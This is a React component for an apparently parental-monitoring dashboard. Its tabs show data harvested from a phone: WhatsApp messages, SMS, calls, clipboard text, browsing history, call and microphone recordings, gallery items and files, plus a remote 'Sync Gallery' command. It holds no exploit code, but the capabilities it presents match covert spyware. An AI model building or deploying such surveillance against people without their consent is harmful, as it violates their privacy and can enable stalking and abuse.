"use client";

import React from "react";
import {
  MessageSquare,
  Phone,
  Bell,
  Globe,
  Music,
  Smartphone,
  Radio,
  FileText,
  Image as ImageIcon,
  Folder,
  ChevronRight,
  ChevronLeft,
  RefreshCw,
  ExternalLink,
  Download,
} from "lucide-react";

export type ActivityTabType =
  | "whatsapp"
  | "calls"
  | "sms"
  | "notifications"
  | "web"
  | "apps"
  | "recordings"
  | "sim"
  | "clipboard"
  | "gallery"
  | "files";

interface ActivityLogListProps {
  activityTab: ActivityTabType;
  setActivityTab: (tab: ActivityTabType) => void;
  whatsappLogs: any[];
  callLogs: any[];
  smsLogs: any[];
  notifications: any[];
  webHistory: any[];
  recordings: any[];
  packageEvents: any[];
  simInfo: any;
  clipboardLogs: any[];
  mediaGallery: any[];
  fileExplorer: any[];
  selectedDirectoryPath: string;
  setSelectedDirectoryPath: (path: string) => void;
  sendCommand: (cmd: string, val: any) => void;
}

export default function ActivityLogList({
  activityTab,
  setActivityTab,
  whatsappLogs,
  callLogs,
  smsLogs,
  notifications,
  webHistory,
  recordings,
  packageEvents,
  simInfo,
  clipboardLogs,
  mediaGallery,
  fileExplorer,
  selectedDirectoryPath,
  setSelectedDirectoryPath,
  sendCommand,
}: ActivityLogListProps) {
  const tabs = [
    { id: "whatsapp" as ActivityTabType, label: "WhatsApp", icon: MessageSquare, count: whatsappLogs.length },
    { id: "calls" as ActivityTabType, label: "Calls", icon: Phone, count: callLogs.length },
    { id: "sms" as ActivityTabType, label: "SMS", icon: MessageSquare, count: smsLogs.length },
    { id: "notifications" as ActivityTabType, label: "Notifs", icon: Bell, count: notifications.length },
    { id: "clipboard" as ActivityTabType, label: "Clipboard", icon: FileText, count: clipboardLogs.length },
    { id: "gallery" as ActivityTabType, label: "Gallery", icon: ImageIcon, count: mediaGallery.length },
    { id: "files" as ActivityTabType, label: "Files", icon: Folder, count: fileExplorer.length },
    { id: "web" as ActivityTabType, label: "Web", icon: Globe, count: webHistory.length },
    { id: "recordings" as ActivityTabType, label: "Recordings", icon: Music, count: recordings.length },
    { id: "apps" as ActivityTabType, label: "Apps", icon: Smartphone, count: packageEvents.length },
    { id: "sim" as ActivityTabType, label: "SIM Info", icon: Radio, count: simInfo ? 1 : 0 },
  ];

  return (
    <div className="flex flex-col gap-3">
      {/* Activity Sub-Navigation */}
      <div className="flex items-center gap-2 overflow-x-auto pb-1">
        {tabs.map((tab) => {
          const IconComp = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActivityTab(tab.id)}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-medium shrink-0 transition ${
                activityTab === tab.id
                  ? "bg-blue-600 text-white shadow-md shadow-blue-600/20"
                  : "bg-[#1E1E26] text-gray-400 hover:bg-[#252530]"
              }`}
            >
              <IconComp className="w-3.5 h-3.5" />
              <span>{tab.label}</span>
              <span className="text-[10px] px-1.5 py-0.5 bg-black/30 rounded-full font-bold">
                {tab.count}
              </span>
            </button>
          );
        })}
      </div>

      {/* WhatsApp Sub-Tab */}
      {activityTab === "whatsapp" && (
        <div className="space-y-2 mt-2">
          {whatsappLogs.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No WhatsApp messages captured yet.</p>
          ) : (
            whatsappLogs.map((item, idx) => (
              <div
                key={idx}
                className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs"
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-green-400">{item.senderName || item.sender || "Unknown"}</span>
                  <span className="text-[10px] text-gray-500">
                    {item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : ""}
                  </span>
                </div>
                <p className="text-gray-300 font-normal">{item.messageText || item.text || item.message}</p>
                {item.type && (
                  <span className="text-[9px] text-gray-500 uppercase tracking-wider font-semibold">
                    Type: {item.type}
                  </span>
                )}
              </div>
            ))
          )}
        </div>
      )}

      {/* Calls Sub-Tab */}
      {activityTab === "calls" && (
        <div className="space-y-2 mt-2">
          {callLogs.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No call history available.</p>
          ) : (
            callLogs.map((call, idx) => (
              <div
                key={idx}
                className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between text-xs"
              >
                <div>
                  <p className="font-bold text-white">{call.number || call.phoneNumber || "Unknown Number"}</p>
                  <p className="text-[10px] text-gray-400">
                    {call.callType || "Call"} • Duration: {call.duration || 0}s
                  </p>
                </div>
                <span className="text-[10px] text-gray-500">
                  {call.timestamp ? new Date(call.timestamp).toLocaleDateString() : ""}
                </span>
              </div>
            ))
          )}
        </div>
      )}

      {/* SMS Sub-Tab */}
      {activityTab === "sms" && (
        <div className="space-y-2 mt-2">
          {smsLogs.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No SMS logs captured.</p>
          ) : (
            smsLogs.map((sms, idx) => (
              <div
                key={idx}
                className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs"
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-blue-400">{sms.address || sms.sender}</span>
                  <span className="text-[10px] text-gray-500">
                    {sms.date ? new Date(sms.date).toLocaleTimeString() : ""}
                  </span>
                </div>
                <p className="text-gray-300">{sms.body || sms.message}</p>
              </div>
            ))
          )}
        </div>
      )}

      {/* Notifications Sub-Tab */}
      {activityTab === "notifications" && (
        <div className="space-y-2 mt-2">
          {notifications.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No app notifications captured.</p>
          ) : (
            notifications.map((notif, idx) => (
              <div
                key={idx}
                className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs"
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-yellow-400">{notif.appName || notif.packageName}</span>
                  <span className="text-[10px] text-gray-500">
                    {notif.timestamp ? new Date(notif.timestamp).toLocaleTimeString() : ""}
                  </span>
                </div>
                <p className="text-white font-medium">{notif.title}</p>
                <p className="text-gray-400 text-[11px]">{notif.text}</p>
              </div>
            ))
          )}
        </div>
      )}

      {/* Web Browsing History */}
      {activityTab === "web" && (
        <div className="space-y-2 mt-2">
          {webHistory.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No web browsing history captured.</p>
          ) : (
            webHistory.map((item, idx) => (
              <div
                key={idx}
                className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between text-xs"
              >
                <div className="min-w-0 pr-3">
                  <p className="font-semibold text-white truncate">{item.title || "Visited Web Page"}</p>
                  <a
                    href={item.url?.startsWith("http") ? item.url : `https://${item.url}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[11px] text-blue-400 hover:underline flex items-center gap-1 mt-0.5 truncate"
                  >
                    <span className="truncate">{item.url}</span>
                    <ExternalLink className="w-3 h-3 shrink-0" />
                  </a>
                </div>
                <span className="text-[10px] text-gray-500 shrink-0">
                  {item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : ""}
                </span>
              </div>
            ))
          )}
        </div>
      )}

      {/* Recordings Sub-Tab */}
      {activityTab === "recordings" && (
        <div className="space-y-2 mt-2">
          {recordings.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No audio recordings saved.</p>
          ) : (
            recordings.map((rec, idx) => (
              <div
                key={rec.id || idx}
                className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-2 text-xs"
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-white flex items-center gap-1.5">
                    <Music className="w-3.5 h-3.5 text-blue-400" />
                    {rec.type === "call" ? "Call Audio Recording" : "Mic Recording"}
                  </span>
                  <span className="text-[10px] text-gray-500">
                    {rec.timestamp ? new Date(rec.timestamp).toLocaleString() : ""}
                  </span>
                </div>
                {(() => {
                  const audioUrl = rec.downloadUrl || rec.storageUrl;
                  return audioUrl ? (
                    <div className="flex flex-col gap-1.5 mt-1">
                      <audio
                        controls
                        src={audioUrl}
                        className="w-full h-8 rounded bg-[#121217]"
                        preload="metadata"
                      />
                      <div className="flex items-center justify-between text-[10px] text-gray-400">
                        <span>
                          {rec.durationSeconds || rec.duration
                            ? `Duration: ${rec.durationSeconds || rec.duration}s`
                            : ""}
                        </span>
                        <a
                          href={audioUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          download
                          className="text-blue-400 hover:underline flex items-center gap-1 font-medium"
                        >
                          <Download className="w-3 h-3" />
                          <span>Download Recording</span>
                        </a>
                      </div>
                    </div>
                  ) : (
                    <p className="text-[11px] text-gray-400">Audio link preparing or unavailable</p>
                  );
                })()}
              </div>
            ))
          )}
        </div>
      )}

      {/* Installed Apps Sub-Tab */}
      {activityTab === "apps" && (
        <div className="space-y-2 mt-2">
          {packageEvents.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">No app install/removal events captured.</p>
          ) : (
            packageEvents.map((event, idx) => (
              <div
                key={idx}
                className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between text-xs"
              >
                <div>
                  <p className="font-bold text-white">{event.appName || event.packageName}</p>
                  <p className="text-[10px] text-gray-400">
                    {event.eventType || "App Event"} • {event.packageName}
                  </p>
                </div>
                <span className="text-[10px] text-gray-500">
                  {event.timestamp ? new Date(event.timestamp).toLocaleString() : ""}
                </span>
              </div>
            ))
          )}
        </div>
      )}

      {/* SIM & Network Sub-Tab */}
      {activityTab === "sim" && (
        <div className="p-4 bg-[#1B1B22] border border-[#272733] rounded-xl text-xs space-y-3">
          {!simInfo ? (
            <p className="text-center py-8 text-gray-500">No SIM details received yet.</p>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className="p-3 bg-[#121217] rounded-lg border border-[#23232c]">
                <p className="text-[10px] text-gray-400">Network Operator</p>
                <p className="text-sm font-bold text-white mt-0.5">{simInfo.operatorName || "N/A"}</p>
              </div>
              <div className="p-3 bg-[#121217] rounded-lg border border-[#23232c]">
                <p className="text-[10px] text-gray-400">Country ISO</p>
                <p className="text-sm font-bold text-white uppercase mt-0.5">{simInfo.countryIso || "N/A"}</p>
              </div>
              <div className="p-3 bg-[#121217] rounded-lg border border-[#23232c]">
                <p className="text-[10px] text-gray-400">SIM State</p>
                <p className="text-sm font-bold text-green-400 mt-0.5">{simInfo.simState || "Active"}</p>
              </div>
              <div className="p-3 bg-[#121217] rounded-lg border border-[#23232c]">
                <p className="text-[10px] text-gray-400">Last Synced</p>
                <p className="text-xs text-gray-300 mt-0.5">
                  {simInfo.lastUpdated ? new Date(simInfo.lastUpdated).toLocaleString() : "Just now"}
                </p>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Clipboard Sub-Tab */}
      {activityTab === "clipboard" && (
        <div className="space-y-2 mt-2">
          {clipboardLogs.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">
              No copied text or links captured yet.
            </p>
          ) : (
            clipboardLogs.map((item, idx) => (
              <div
                key={idx}
                className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1.5 text-xs"
              >
                <div className="flex items-center justify-between">
                  <span className="text-[10px] px-2 py-0.5 bg-blue-950 text-blue-300 border border-blue-800/40 rounded-full font-bold">
                    Copied Text
                  </span>
                  <span className="text-[10px] text-gray-500">
                    {item.timestamp ? new Date(item.timestamp).toLocaleString() : ""}
                  </span>
                </div>
                <p className="text-gray-200 font-mono bg-[#121217] p-2.5 rounded-lg border border-[#22222b] break-words select-all">
                  {item.text || item.copiedText}
                </p>
              </div>
            ))
          )}
        </div>
      )}

      {/* Media Gallery Sub-Tab */}
      {activityTab === "gallery" && (
        <div className="space-y-3 mt-2">
          <div className="flex items-center justify-between">
            <p className="text-xs text-gray-400">Photos & Videos on device ({mediaGallery.length} detected)</p>
            <button
              onClick={() => sendCommand("SYNC_MEDIA", true)}
              className="px-2.5 py-1 bg-[#252530] hover:bg-[#2e2e3d] text-gray-300 text-[11px] rounded-lg flex items-center gap-1.5 transition"
            >
              <RefreshCw className="w-3 h-3" />
              <span>Sync Gallery</span>
            </button>
          </div>
          {mediaGallery.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">
              No gallery media synced yet. Click "Sync Gallery" to scan child's photos.
            </p>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
              {mediaGallery.map((item, idx) => (
                <div
                  key={idx}
                  className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center gap-3 text-xs"
                >
                  <div className="p-2.5 bg-purple-600/20 text-purple-400 rounded-lg shrink-0">
                    <ImageIcon className="w-4 h-4" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-white font-medium truncate" title={item.fileName}>
                      {item.fileName || "Media item"}
                    </p>
                    <p className="text-[10px] text-gray-400 mt-0.5 truncate">
                      {item.filePath || "Internal Storage"}
                    </p>
                    <div className="flex items-center gap-2 mt-1 text-[9px] text-gray-500 font-mono">
                      <span>{item.fileType || "IMAGE"}</span>
                      {item.sizeBytes > 0 && <span>• {(item.sizeBytes / 1024 / 1024).toFixed(2)} MB</span>}
                      {item.dateAdded > 0 && <span>• {new Date(item.dateAdded).toLocaleDateString()}</span>}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* File Explorer Sub-Tab */}
      {activityTab === "files" && (
        <div className="space-y-3 mt-2">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              {selectedDirectoryPath && (
                <button
                  onClick={() => setSelectedDirectoryPath("")}
                  className="px-2 py-1 bg-[#252530] hover:bg-[#2e2e3d] text-blue-400 text-xs rounded-lg flex items-center gap-1 transition"
                >
                  <ChevronLeft className="w-3.5 h-3.5" />
                  <span>All Folders</span>
                </button>
              )}
              <p className="text-xs text-gray-400 truncate max-w-xs sm:max-w-md">
                {selectedDirectoryPath
                  ? `Folder: ${selectedDirectoryPath.split("/").pop()}`
                  : `Device File Explorer (${fileExplorer.length} items detected)`}
              </p>
            </div>
            <button
              onClick={() => sendCommand("SYNC_MEDIA", true)}
              className="px-2.5 py-1 bg-[#252530] hover:bg-[#2e2e3d] text-gray-300 text-[11px] rounded-lg flex items-center gap-1.5 transition shrink-0"
            >
              <RefreshCw className="w-3 h-3" />
              <span>Rescan Storage</span>
            </button>
          </div>
          {fileExplorer.length === 0 ? (
            <p className="text-center py-10 text-xs text-gray-500">
              No files synced yet. Click "Rescan Storage" to list files.
            </p>
          ) : (
            <div className="space-y-1.5">
              {(() => {
                const displayItems = selectedDirectoryPath
                  ? fileExplorer.filter(
                      (item) =>
                        item.parentPath === selectedDirectoryPath ||
                        (item.path.startsWith(selectedDirectoryPath + "/") &&
                          item.path.substring(selectedDirectoryPath.length + 1).indexOf("/") === -1)
                    )
                  : fileExplorer.filter(
                      (item) => !item.parentPath || item.parentPath === "" || item.isDirectory
                    );

                const sortedItems = [...displayItems].sort((a, b) => {
                  if (a.isDirectory && !b.isDirectory) return -1;
                  if (!a.isDirectory && b.isDirectory) return 1;
                  return (a.name || "").localeCompare(b.name || "");
                });

                if (sortedItems.length === 0 && selectedDirectoryPath) {
                  return (
                    <div className="p-8 text-center text-xs text-gray-500 bg-[#16161D] rounded-xl border border-[#272733]">
                      This folder is empty or contains no recognized sub-files.
                    </div>
                  );
                }

                return sortedItems.map((item, idx) => (
                  <div
                    key={idx}
                    onClick={() => {
                      if (item.isDirectory) {
                        setSelectedDirectoryPath(item.path);
                      }
                    }}
                    className={`p-2.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between gap-3 text-xs transition ${
                      item.isDirectory ? "hover:border-amber-500/50 hover:bg-[#22222c] cursor-pointer" : ""
                    }`}
                  >
                    <div className="flex items-center gap-2.5 min-w-0">
                      <div
                        className={`p-2 rounded-lg shrink-0 ${
                          item.isDirectory ? "bg-amber-600/20 text-amber-400" : "bg-blue-600/20 text-blue-400"
                        }`}
                      >
                        {item.isDirectory ? <Folder className="w-4 h-4" /> : <FileText className="w-4 h-4" />}
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-1.5">
                          <p className="text-white font-medium truncate" title={item.name}>
                            {item.name || item.path}
                          </p>
                          {item.isDirectory && (
                            <span className="text-[9px] px-1.5 py-0.2 bg-amber-950 text-amber-300 border border-amber-800/40 rounded font-bold">
                              Folder
                            </span>
                          )}
                        </div>
                        <p className="text-[10px] text-gray-500 font-mono truncate mt-0.5" title={item.path}>
                          {item.path}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2 shrink-0">
                      <div className="text-right">
                        <span className="text-[10px] text-gray-400 block font-mono">
                          {item.isDirectory ? "DIR" : `${(item.sizeBytes / 1024).toFixed(1)} KB`}
                        </span>
                        {item.lastModified > 0 && (
                          <span className="text-[9px] text-gray-500 block">
                            {new Date(item.lastModified).toLocaleDateString()}
                          </span>
                        )}
                      </div>
                      {item.isDirectory && <ChevronRight className="w-4 h-4 text-gray-500" />}
                    </div>
                  </div>
                ));
              })()}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
